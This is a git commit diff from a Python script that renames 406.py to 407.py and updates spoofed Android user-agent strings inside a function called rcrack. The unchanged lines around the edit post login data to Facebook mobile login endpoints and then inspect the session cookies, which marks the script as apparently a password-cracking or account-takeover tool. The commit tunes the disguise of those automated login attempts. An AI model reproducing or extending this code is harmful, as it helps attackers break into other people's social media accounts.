3320fa3419c9c193c4e494e6a2c170243e672e28
ANOX401 <146512659+ANOX401@users.noreply.github.com>
2023-10-02 13:08:15 +0530

    Update and rename 406.py to 407.py

--- 407.py
+++ 407.py
@@ -327,7 +327,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POT-AL00a Build/HUAWEIPOT-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/273.0.0.39.123;]',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36;]',}
 			lo = session.post('https://x.facebook.com/?stype=lo&jlou=AfeBh1P5XSlSM2wms2C4U9Hnl-2G6_2Hu6YuPY48KB5TIXB6DvoWscdFgWbOPrLKsVL0Kgk3OXFhVxwRM2moqOmStv3iCJMU3SWceuZ4YHNsxQ&smuh=1245&lh=Ac_u--FyoUL4CN2u9NE&wtsid',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 
@@ -449,7 +449,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',}
 			lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 
